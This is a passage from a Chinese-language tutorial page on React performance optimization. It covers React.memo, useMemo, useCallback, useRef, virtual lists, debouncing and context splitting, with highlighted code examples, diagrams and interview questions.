<span class="hljs-keyword">const</span> [messages, setMessages] = <span class="hljs-title function_">useState</span>([]);<br>  <span class="hljs-keyword">const</span> socketRef = <span class="hljs-title function_">useRef</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    socketRef.<span class="hljs-property">current</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;wss://...&#x27;</span>);<br>    socketRef.<span class="hljs-property">current</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>      <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">msgs</span> =&gt;</span> [...msgs, event.<span class="hljs-property">data</span>]);<br>    &#125;;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> socketRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">close</span>();<br>  &#125;, []);<br>  <br>  <span class="hljs-comment">// 在其他函数中使用</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = (<span class="hljs-params">text</span>) =&gt; &#123;<br>    socketRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">send</span>(text);<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案-11"><a href="#高频面试题与破解方案-11" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：useMemo 和 useCallback 有何区别？</strong></p><p>核心区别：</p><ul><li>useMemo 缓存计算结果，用于避免重复计算</li><li>useCallback 缓存函数引用，用于保持引用稳定</li></ul><p>等效关系：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">useCallback</span>(fn, deps) === <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> fn, deps)<br></code></pre></td></tr></table></figure><p><strong>Q：何时该用 useMemo&#x2F;useCallback？</strong></p><pre class="mermaid">graph TD  A[需要优化?] -->|否| B[直接计算/定义函数]  A -->|是| C{优化类型?}  C -->|避免计算开销| D[用useMemo]  C -->|避免子组件重渲染| E[useCallback+React.memo]  C -->|稳定依赖项| F[两者皆可]</pre><p><strong>Q：useRef 和 useState 有何区别？</strong></p><table><thead><tr><th align="left">特性</th><th align="left">useRef</th><th align="left">useState</th></tr></thead><tbody><tr><td align="left">触发重渲染</td><td align="left">否</td><td align="left">是</td></tr><tr><td align="left">存储值类型</td><td align="left">可变对象（.current）</td><td align="left">不可变状态</td></tr><tr><td align="left">数据持久化</td><td align="left">组件生命周期</td><td align="left">状态更新保留</td></tr><tr><td align="left">典型用途</td><td align="left">DOM 引用&#x2F;计时器 ID</td><td align="left">渲染相关状态</td></tr><tr><td align="left">初始化</td><td align="left">useRef(initial)</td><td align="left">useState(initial)</td></tr></tbody></table><h3 id="高级优化模式"><a href="#高级优化模式" class="headerlink" title="高级优化模式"></a>高级优化模式</h3><p><strong>虚拟滚动优化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">VirtualList</span>(<span class="hljs-params">&#123; items, itemHeight &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> containerRef = <span class="hljs-title function_">useRef</span>();<br>  <span class="hljs-keyword">const</span> [visibleRange, setVisibleRange] = <span class="hljs-title function_">useState</span>([<span class="hljs-number">0</span>, <span class="hljs-number">10</span>]);<br>  <br>  <span class="hljs-comment">// 缓存可见项</span><br>  <span class="hljs-keyword">const</span> visibleItems = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> items.<span class="hljs-title function_">slice</span>(visibleRange[<span class="hljs-number">0</span>], visibleRange[<span class="hljs-number">1</span>]);<br>  &#125;, [items, visibleRange]);<br>  <br>  <span class="hljs-comment">// 计算总高度（虚拟滚动）</span><br>  <span class="hljs-keyword">const</span> totalHeight = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> items.<span class="hljs-property">length</span> * itemHeight;<br>  &#125;, [items.<span class="hljs-property">length</span>, itemHeight]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;containerRef&#125;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">height:</span> &#x27;<span class="hljs-attr">500px</span>&#x27;, <span class="hljs-attr">overflow:</span> &#x27;<span class="hljs-attr">auto</span>&#x27; &#125;&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> <span class="hljs-attr">height:</span> `$&#123;<span class="hljs-attr">totalHeight</span>&#125;<span class="hljs-attr">px</span>`, <span class="hljs-attr">position:</span> &#x27;<span class="hljs-attr">relative</span>&#x27; &#125;&#125;&gt;</span></span><br><span class="language-xml">        &#123;visibleItems.map(item =&gt; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Item</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;item.id&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">item</span>=<span class="hljs-string">&#123;item&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;&#123;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">position:</span> &#x27;<span class="hljs-attr">absolute</span>&#x27;,</span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">top:</span> `$&#123;<span class="hljs-attr">item.index</span> * <span class="hljs-attr">itemHeight</span>&#125;<span class="hljs-attr">px</span>` </span></span><br><span class="hljs-tag"><span class="language-xml">            &#125;&#125;</span></span><br><span class="hljs-tag"><span class="language-xml">          /&gt;</span></span><br><span class="language-xml">        ))&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>防抖&#x2F;节流优化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useDebounce</span>(<span class="hljs-params">value, delay</span>) &#123;<br>  <span class="hljs-keyword">const</span> [debouncedValue, setDebouncedValue] = <span class="hljs-title function_">useState</span>(value);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">setDebouncedValue</span>(value), delay);<br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearTimeout</span>(timer);<br>  &#125;, [value, delay]);<br>  <br>  <span class="hljs-keyword">return</span> debouncedValue;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Search</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [query, setQuery] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <span class="hljs-keyword">const</span> debouncedQuery = <span class="hljs-title function_">useDebounce</span>(query, <span class="hljs-number">300</span>);<br>  <br>  <span class="hljs-comment">// 使用useMemo避免重复请求</span><br>  <span class="hljs-keyword">const</span> results = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetchResults</span>(debouncedQuery);<br>  &#125;, [debouncedQuery]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;query&#125;</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;e</span> =&gt;</span> setQuery(e.target.value)&#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Results</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;results&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="总结：性能优化决策"><a href="#总结：性能优化决策" class="headerlink" title="总结：性能优化决策"></a>总结：性能优化决策</h3><pre class="mermaid">graph TD  A[性能问题?] -->|是| B{问题类型}  A -->|否| C[无需优化]  B -->|组件重渲染过多| D[React.memo+useCallback]  B -->|计算开销大| E[useMemo]  B -->|DOM操作频繁| F[useRef+useLayoutEffect]  D --> G[验证优化效果]  E --> G  F --> G  G -->|解决| H[停止]  G -->|未解决| I[性能分析工具]</pre><h1 id="第四章：React-高级特性"><a href="#第四章：React-高级特性" class="headerlink" title="第四章：React 高级特性"></a>第四章：React 高级特性</h1><h2 id="4-1-性能优化（React-memo、useMemo、useCallback）"><a href="#4-1-性能优化（React-memo、useMemo、useCallback）" class="headerlink" title="4.1 性能优化（React.memo、useMemo、useCallback）"></a>4.1 性能优化（React.memo、useMemo、useCallback）</h2><h3 id="性能优化核心原则"><a href="#性能优化核心原则" class="headerlink" title="性能优化核心原则"></a>性能优化核心原则</h3><p><strong>React 渲染机制回顾</strong></p><pre class="mermaid">graph LRA[状态/Props变化] --> B[组件重新渲染]B --> C{子组件是否更新?}C -->|Props变化| D[重新渲染子组件]C -->|Props未变化| E[跳过子组件渲染]</pre><p><strong>性能优化核心策略</strong></p><table><thead><tr><th align="left">优化策略</th><th align="left">适用场景</th><th align="left">实现方式</th></tr></thead><tbody><tr><td align="left">减少渲染次数</td><td align="left">避免不必要的渲染</td><td align="left">React.memo、PureComponent</td></tr><tr><td align="left">减少计算量</td><td align="left">复杂计算&#x2F;数据转换</td><td align="left">useMemo</td></tr><tr><td align="left">保持引用稳定</td><td align="left">函数&#x2F;对象作为依赖项</td><td align="left">useCallback、useMemo</td></tr><tr><td align="left">虚拟化长列表</td><td align="left">大数据量渲染</td><td align="left">react-window、react-virtualized</td></tr></tbody></table><h3 id="核心-API-深度解析"><a href="#核心-API-深度解析" class="headerlink" title="核心 API 深度解析"></a>核心 API 深度解析</h3><p><strong>React.memo 详解</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 基础用法</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-comment">/* 使用 props 渲染 */</span><br>&#125;);<br><br><span class="hljs-comment">// 自定义比较函数</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserProfile</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; user, settings &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Avatar</span> <span class="hljs-attr">url</span>=<span class="hljs-string">&#123;user.avatar&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Preferences</span> <span class="hljs-attr">options</span>=<span class="hljs-string">&#123;settings&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;, <span class="hljs-function">(<span class="hljs-params">prevProps, nextProps</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 仅在 user.id 或 settings.theme 变化时重新渲染</span><br>  <span class="hljs-keyword">return</span> prevProps.<span class="hljs-property">user</span>.<span class="hljs-property">id</span> === nextProps.<span class="hljs-property">user</span>.<span class="hljs-property">id</span> &amp;&amp; <br>         prevProps.<span class="hljs-property">settings</span>.<span class="hljs-property">theme</span> === nextProps.<span class="hljs-property">settings</span>.<span class="hljs-property">theme</span>;<br>&#125;);<br></code></pre></td></tr></table></figure><p>关键特性：</p><ul><li>仅进行浅比较（shallow compare）</li><li>比较函数返回 true 表示不需要重新渲染</li><li>适用于函数组件</li></ul><p>优化场景：</p><ul><li>纯展示型组件（无内部状态）</li><li>接收复杂对象 Props 的组件</li><li>位于渲染频繁组件树中的叶子节点</li></ul><p><strong>useMemo 深度应用</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductList</span>(<span class="hljs-params">&#123; products, filterText, sortBy &#125;</span>) &#123;<br>  <span class="hljs-comment">// 缓存复杂计算结果</span><br>  <span class="hljs-keyword">const</span> filteredProducts = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;重新计算过滤产品&#x27;</span>);<br>    <span class="hljs-keyword">return</span> products.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> <br>      p.<span class="hljs-property">name</span>.<span class="hljs-title function_">toLowerCase</span>().<span class="hljs-title function_">includes</span>(filterText.<span class="hljs-title function_">toLowerCase</span>())<br>    );<br>  &#125;, [products, filterText]); <span class="hljs-comment">// 依赖项</span><br>  <br>  <span class="hljs-comment">// 缓存排序结果</span><br>  <span class="hljs-keyword">const</span> sortedProducts = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;重新排序产品&#x27;</span>);<br>    <span class="hljs-keyword">return</span> [...filteredProducts].<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (sortBy === <span class="hljs-string">&#x27;price&#x27;</span>) <span class="hljs-keyword">return</span> a.<span class="hljs-property">price</span> - b.<span class="hljs-property">price</span>;<br>      <span class="hljs-keyword">return</span> a.<span class="hljs-property">name</span>.<span class="hljs-title function_">localeCompare</span>(b.<span class="hljs-property">name</span>);<br>    &#125;);<br>  &#125;, [filteredProducts, sortBy]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">      &#123;sortedProducts.map(product =&gt; (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">ProductItem</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;product.id&#125;</span> <span class="hljs-attr">product</span>=<span class="hljs-string">&#123;product&#125;</span> /&gt;</span></span><br><span class="language-xml">      ))&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>关键特性：</p><ul><li>缓存计算结果，避免重复计算</li><li>依赖项变化时重新计算</li><li>适用于：复杂计算、数据转换、组件记忆化</li></ul><p>性能陷阱：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 错误用法：useMemo 作为语义保证</span><br><span class="hljs-keyword">const</span> data = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">fetchData</span>(), []); <span class="hljs-comment">// 不会阻止重复请求</span><br><br><span class="hljs-comment">// 正确用法：仅用于性能优化</span><br><span class="hljs-keyword">const</span> transformedData = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> <br>  rawData.<span class="hljs-title function_">map</span>(transformItem), <br>[rawData]);<br></code></pre></td></tr></table></figure><p><strong>useCallback 高级用法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ParentComponent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-comment">// 缓存函数引用</span><br>  <span class="hljs-keyword">const</span> handleClick = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;点击事件&#x27;</span>, count);<br>    <span class="hljs-comment">// 注意：闭包陷阱！count 是创建时的值</span><br>  &#125;, [count]); <span class="hljs-comment">// 依赖 count 保证最新值</span><br>  <br>  <span class="hljs-comment">// 使用 ref 解决闭包问题</span><br>  <span class="hljs-keyword">const</span> countRef = <span class="hljs-title function_">useRef</span>(count);<br>  countRef.<span class="hljs-property">current</span> = count;<br>  <br>  <span class="hljs-keyword">const</span> stableHandler = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;最新值:&#x27;</span>, countRef.<span class="hljs-property">current</span>);<br>  &#125;, []); <span class="hljs-comment">// 无依赖，函数引用稳定</span><br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> setCount(c =&gt; c + 1)&#125;&gt;增加 &#123;count&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;stableHandler&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ChildComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">&#123; onClick &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;子组件渲染&#x27;</span>);<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClick&#125;</span>&gt;</span>触发事件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;);<br></code></pre></td></tr></table></figure><p>关键特性：</p><ul><li>缓存函数引用，避免子组件不必要渲染</li><li>依赖项变化时创建新函数</li><li>适用于：事件处理函数、传递给子组件的回调</li></ul><p>最佳实践：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 依赖项处理技巧</span><br><span class="hljs-keyword">const</span> handleSubmit = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  api.<span class="hljs-title function_">submitForm</span>(formState);<br>&#125;, [formState]); <span class="hljs-comment">// ✅ 正确：依赖实际使用的状态</span><br><br><span class="hljs-comment">// 使用函数式更新避免依赖</span><br><span class="hljs-keyword">const</span> increment = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>); <span class="hljs-comment">// ✅ 不依赖 count</span><br>&#125;, []);<br></code></pre></td></tr></table></figure><h3 id="综合优化策略"><a href="#综合优化策略" class="headerlink" title="综合优化策略"></a>综合优化策略</h3><p><strong>组件结构优化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 优化前：状态提升导致频繁渲染</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, setState] = <span class="hljs-title function_">useState</span>(&#123;&#125;);<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ExpensiveComponent</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;state.data&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ControlPanel</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;setState&#125;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 优化后：状态下沉</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">OptimizedParent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">DataContainer</span>&gt;</span></span><br><span class="language-xml">        &#123;(data) =&gt; <span class="hljs-tag">&lt;<span class="hljs-name">ExpensiveComponent</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span>&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">DataContainer</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ControlPanel</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">DataContainer</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [data, setData] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-comment">// 状态管理隔离在此组件</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">children</span>(data);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>上下文优化技巧</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建拆分上下文</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">SettingsContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <span class="hljs-keyword">const</span> [settings, setSettings] = <span class="hljs-title function_">useState</span>(&#123;&#125;);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">UserContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;user&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">SettingsContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;settings&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">MainContent</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">SettingsContext.Provider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">UserContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 消费者组件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">ThemeSwitcher</span> = (<span 